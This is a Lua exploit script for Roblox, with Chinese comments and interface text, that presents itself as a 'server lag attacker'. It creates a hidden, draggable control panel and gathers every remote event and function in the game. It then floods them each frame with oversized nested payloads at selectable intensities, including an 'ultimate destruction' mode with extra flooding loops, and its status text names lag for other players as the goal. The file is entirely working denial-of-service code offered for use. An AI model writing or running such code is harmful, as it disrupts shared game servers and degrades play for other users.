-- 文件名：ServerLagAttack_Ultimate.lua
-- 11VERTG

local LagAttack = {}
LagAttack.IsRunning = false
LagAttack.AttackMode = "NORMAL"
LagAttack.RemoteObjects = {}
LagAttack.MaxAttackPower = 100
LagAttack.CurrentPower = 0
LagAttack.Stats = {
    totalCalls = 0,
    serverImpact = 0,
    playersAffected = 0
}

-- 创建攻击界面
function LagAttack.createUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ServerLagAttackGUI"
    screenGui.ResetOnSpawn = false
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 350)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
    mainFrame.BackgroundColor3 = Color3.new(0.1, 0, 0)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    
    -- 标题栏
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.BackgroundColor3 = Color3.new(0.8, 0, 0)
    titleBar.Parent = mainFrame
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, 0, 1, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "XTTT服务器攻击器"
    titleLabel.TextColor3 = Color3.new(1, 1, 1)
    titleLabel.TextSize = 14
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Parent = titleBar
    
    -- 攻击模式选择
    local modeFrame = Instance.new("Frame")
    modeFrame.Size = UDim2.new(1, -10, 0, 100)
    modeFrame.Position = UDim2.new(0, 5, 0, 35)
    modeFrame.BackgroundTransparency = 1
    modeFrame.Parent = mainFrame
    
    local modeLabel = Instance.new("TextLabel")
    modeLabel.Size = UDim2.new(1, 0, 0, 20)
    modeLabel.Text = "攻击强度:"
    modeLabel.TextColor3 = Color3.new(1, 1, 1)
    modeLabel.BackgroundTransparency = 1
    modeLabel.Parent = modeFrame
    
    -- 攻击按钮
    local lightAttack = Instance.new("TextButton")
    lightAttack.Size = UDim2.new(0.3, -5, 0, 30)
    lightAttack.Position = UDim2.new(0, 0, 0, 25)
    lightAttack.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
    lightAttack.Text = "轻度攻击"
    lightAttack.TextColor3 = Color3.new(1, 1, 1)
    lightAttack.Parent = modeFrame
    
    local mediumAttack = Instance.new("TextButton")
    mediumAttack.Size = UDim2.new(0.3, -5, 0, 30)
    mediumAttack.Position = UDim2.new(0.35, 0, 0, 25)
    mediumAttack.BackgroundColor3 = Color3.new(0.8, 0.8, 0.2)
    mediumAttack.Text = "中度攻击"
    mediumAttack.TextColor3 = Color3.new(1, 1, 1)
    mediumAttack.Parent = modeFrame
    
    local heavyAttack = Instance.new("TextButton")
    heavyAttack.Size = UDim2.new(0.3, -5, 0, 30)
    heavyAttack.Position = UDim2.new(0.7, 0, 0, 25)
    heavyAttack.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
    heavyAttack.Text = "重度攻击"
    heavyAttack.TextColor3 = Color3.new(1, 1, 1)
    heavyAttack.Parent = modeFrame
    
    -- 终极攻击
    local ultimateAttack = Instance.new("TextButton")
    ultimateAttack.Size = UDim2.new(1, 0, 0, 35)
    ultimateAttack.Position = UDim2.new(0, 0, 0, 60)
    ultimateAttack.BackgroundColor3 = Color3.new(0.5, 0, 0.5)
    ultimateAttack.Text = "终极服务器毁灭模式"
    ultimateAttack.TextColor3 = Color3.new(1, 1, 1)
    ultimateAttack.TextSize = 12
    ultimateAttack.Parent = modeFrame
    
    -- 状态显示
    local statusFrame = Instance.new("Frame")
    statusFrame.Size = UDim2.new(1, -10, 0, 150)
    statusFrame.Position = UDim2.new(0, 5, 0, 140)
    statusFrame.BackgroundColor3 = Color3.new(0.05, 0.05, 0.05)
    statusFrame.Parent = mainFrame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -10, 1, -10)
    statusLabel.Position = UDim2.new(0, 5, 0, 5)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "点击上方按钮开始攻击服务器...\n\n攻击效果：其他玩家会卡顿、瞬移"
    statusLabel.TextColor3 = Color3.new(1, 1, 1)
    statusLabel.TextSize = 11
    statusLabel.TextWrapped = true
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.TextYAlignment = Enum.TextYAlignment.Top
    statusLabel.Parent = statusFrame
    
    -- 控制按钮
    local controlFrame = Instance.new("Frame")
    controlFrame.Size = UDim2.new(1, -10, 0, 40)
    controlFrame.Position = UDim2.new(0, 5, 1, -45)
    controlFrame.BackgroundTransparency = 1
    controlFrame.Parent = mainFrame
    
    local stopButton = Instance.new("TextButton")
    stopButton.Size = UDim2.new(0.5, -5, 1, 0)
    stopButton.Position = UDim2.new(0, 0, 0, 0)
    stopButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
    stopButton.Text = "停止攻击"
    stopButton.TextColor3 = Color3.new(1, 1, 1)
    stopButton.Parent = controlFrame
    
    local hideButton = Instance.new("TextButton")
    hideButton.Size = UDim2.new(0.5, -5, 1, 0)
    hideButton.Position = UDim2.new(0.5, 5, 0, 0)
    hideButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
    hideButton.Text = "隐藏界面"
    hideButton.TextColor3 = Color3.new(1, 1, 1)
    hideButton.Parent = controlFrame
    
    screenGui.Parent = game:GetService("CoreGui")
    mainFrame.Parent = screenGui
    
    -- 保存引用
    LagAttack.UI = {
        ScreenGui = screenGui,
        MainFrame = mainFrame,
        StatusLabel = statusLabel,
        LightAttack = lightAttack,
        MediumAttack = mediumAttack,
        HeavyAttack = heavyAttack,
        UltimateAttack = ultimateAttack,
        StopButton = stopButton,
        HideButton = hideButton
    }
    
    return mainFrame
end

-- 设置按钮功能
function LagAttack.setupFunctions()
    -- 攻击按钮事件
    LagAttack.UI.LightAttack.MouseButton1Click:Connect(function()
        LagAttack.startAttack("LIGHT")
    end)
    
    LagAttack.UI.MediumAttack.MouseButton1Click:Connect(function()
        LagAttack.startAttack("MEDIUM")
    end)
    
    LagAttack.UI.HeavyAttack.MouseButton1Click:Connect(function()
        LagAttack.startAttack("HEAVY")
    end)
    
    LagAttack.UI.UltimateAttack.MouseButton1Click:Connect(function()
        LagAttack.startAttack("ULTIMATE")
    end)
    
    LagAttack.UI.StopButton.MouseButton1Click:Connect(function()
        LagAttack.stopAttack()
    end)
    
    LagAttack.UI.HideButton.MouseButton1Click:Connect(function()
        LagAttack.UI.ScreenGui.Enabled = false
    end)
end

-- 更新状态
function LagAttack.updateStatus(text)
    if LagAttack.UI and LagAttack.UI.StatusLabel then
        LagAttack.UI.StatusLabel.Text = text
    end
end

-- 收集所有远程对象
function LagAttack.collectRemotes()
    LagAttack.RemoteObjects = {}
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ServerScriptService"),
        game:GetService("ServerStorage"),
        game:GetService("Workspace"),
        game:GetService("Players")
    }
    
    for _, service in ipairs(services) do
        for _, remote in ipairs(service:GetDescendants()) do
            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                table.insert(LagAttack.RemoteObjects, remote)
            end
        end
    end
end

-- 生成攻击数据
function LagAttack.generateAttackData(powerLevel)
    local dataSizes = {
        LIGHT = 10,      -- 轻度：10个参数
        MEDIUM = 50,     -- 中度：50个参数  
        HEAVY = 200,     -- 重度：200个参数
        ULTIMATE = 1000  -- 终极：1000个参数
    }
    
    local size = dataSizes[powerLevel] or 10
    local attackData = {}
    
    -- 生成大量数据占用服务器资源
    for i = 1, size do
        attackData[i] = {
            type = "attack",
            index = i,
            timestamp = tick(),
            randomData = string.rep("X", math.random(10, 100)),
            nestedTable = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10},
            deepNested = {
                level1 = {
                    level2 = {
                        level3 = {
                            data = "消耗服务器CPU资源"
                        }
                    }
                }
            }
        }
    end
    
    return attackData
end

-- 执行服务器攻击
function LagAttack.executeServerAttack(remote, powerLevel)
    local attackData = LagAttack.generateAttackData(powerLevel)
    
    local success = pcall(function()
        if remote:IsA("RemoteEvent") then
            -- 多次调用增加服务器压力
            for i = 1, LagAttack.getAttackMultiplier(powerLevel) do
                remote:FireServer(attackData)
                LagAttack.Stats.totalCalls = LagAttack.Stats.totalCalls + 1
            end
        elseif remote:IsA("RemoteFunction") then
            for i = 1, LagAttack.getAttackMultiplier(powerLevel) do
                remote:InvokeServer(attackData)
                LagAttack.Stats.totalCalls = LagAttack.Stats.totalCalls + 1
            end
        end
    end)
    
    return success
end

-- 获取攻击倍数
function LagAttack.getAttackMultiplier(powerLevel)
    local multipliers = {
        LIGHT = 1,      -- 轻度：1倍
        MEDIUM = 5,     -- 中度：5倍
        HEAVY = 20,     -- 重度：20倍
        ULTIMATE = 100  -- 终极：100倍
    }
    return multipliers[powerLevel] or 1
end

-- 开始攻击
function LagAttack.startAttack(mode)
    if LagAttack.IsRunning then
        LagAttack.stopAttack()
        wait(0.1)
    end
    
    LagAttack.IsRunning = true
    LagAttack.AttackMode = mode
    LagAttack.collectRemotes()
    
    local modeNames = {
        LIGHT = "轻度攻击",
        MEDIUM = "中度攻击", 
        HEAVY = "重度攻击",
        ULTIMATE = "终极毁灭模式"
    }
    
    LagAttack.updateStatus(modeNames[mode] .. "进行中...\n服务器卡顿效果：其他玩家会瞬移\n攻击次数: 0")
    
    -- 根据模式设置攻击频率
    local attackInterval = LagAttack.getAttackInterval(mode)
    
    LagAttack.AttackConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if not LagAttack.IsRunning then return end
        
        -- 对每个远程对象执行攻击
        for _, remote in ipairs(LagAttack.RemoteObjects) do
            if remote and remote.Parent then
                LagAttack.executeServerAttack(remote, mode)
            end
        end
        
        -- 更新状态显示
        LagAttack.updateAttackStatus()
    end)
    
    -- 额外攻击线程（终极模式）
    if mode == "ULTIMATE" then
        LagAttack.startUltimateAttack()
    end
end

-- 获取攻击间隔
function LagAttack.getAttackInterval(mode)
    local intervals = {
        LIGHT = 0.3,    -- 轻度：0.3秒
        MEDIUM = 0.1,   -- 中度：0.1秒
        HEAVY = 0.05,   -- 重度：0.05秒
        ULTIMATE = 0.01 -- 终极：0.01秒
    }
    return intervals[mode] or 0.1
end

-- 终极攻击模式
function LagAttack.startUltimateAttack()
    LagAttack.UltimateConnections = {}
    
    -- 多线程攻击
    for i = 1, 5 do
        local conn = game:GetService("RunService").Heartbeat:Connect(function()
            if not LagAttack.IsRunning then return end
            
            for _, remote in ipairs(LagAttack.RemoteObjects) do
                if remote and remote.Parent then
                    -- 发送超大负载数据
                    local massiveData = {
                        type = "ultimate_attack",
                        size = 10000,
                        data = string.rep("ULTIMATE_LAG_", 1000),
                        nested = {
                            a = {b = {c = {d = {e = {f = {g = "LAG!"}}}}}}
                        }
                    }
                    
                    pcall(function()
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(massiveData)
                        else
                            remote:InvokeServer(massiveData)
                        end
                    end)
                end
            end
        end)
        
        table.insert(LagAttack.UltimateConnections, conn)
    end
end

-- 更新攻击状态
function LagAttack.updateAttackStatus()
    local playerCount = #game.Players:GetPlayers()
    local impactLevel = math.min(100, LagAttack.Stats.totalCalls / 100)
    
    local statusText = string.format(
        "%s攻击中...\n服务器影响: %d%%\n玩家受影响: %d人\n攻击次数: %d",
        LagAttack.AttackMode,
        impactLevel,
        playerCount - 1, -- 排除自己
        LagAttack.Stats.totalCalls
    )
    
    LagAttack.updateStatus(statusText)
    
    -- 界面特效
    if LagAttack.UI and LagAttack.UI.MainFrame then
        local frame = LagAttack.UI.MainFrame
        local intensity = impactLevel / 100
        frame.BackgroundColor3 = Color3.new(0.1 + intensity * 0.5, 0, 0)
    end
end

-- 停止攻击
function LagAttack.stopAttack()
    LagAttack.IsRunning = false
    
    if LagAttack.AttackConnection then
        LagAttack.AttackConnection:Disconnect()
        LagAttack.AttackConnection = nil
    end
    
    if LagAttack.UltimateConnections then
        for _, conn in ipairs(LagAttack.UltimateConnections) do
            conn:Disconnect()
        end
        LagAttack.UltimateConnections = {}
    end
    
    LagAttack.updateStatus("攻击已停止\n最终统计:\n攻击次数: " .. LagAttack.Stats.totalCalls .. "\n服务器已恢复")
    
    if LagAttack.UI and LagAttack.UI.MainFrame then
        LagAttack.UI.MainFrame.BackgroundColor3 = Color3.new(0.1, 0, 0)
    end
end

-- 快捷键支持
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.F9 then
        LagAttack.UI.ScreenGui.Enabled = not LagAttack.UI.ScreenGui.Enabled
    elseif input.KeyCode == Enum.KeyCode.F8 then
        if not LagAttack.IsRunning then
            LagAttack.startAttack("HEAVY")
        else
            LagAttack.stopAttack()
        end
    end
end)

-- 初始化
function LagAttack.init()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    LagAttack.createUI()
    LagAttack.setupFunctions()
    
    LagAttack.updateStatus("服务器卡顿攻击器已加载\n\n快捷键:\nF9 - 显示/隐藏界面\nF8 - 开始/停止攻击\n\n选择攻击强度开始!")
end

-- 自动启动
spawn(function()
    wait(2)
    LagAttack.init()
end)

return LagAttack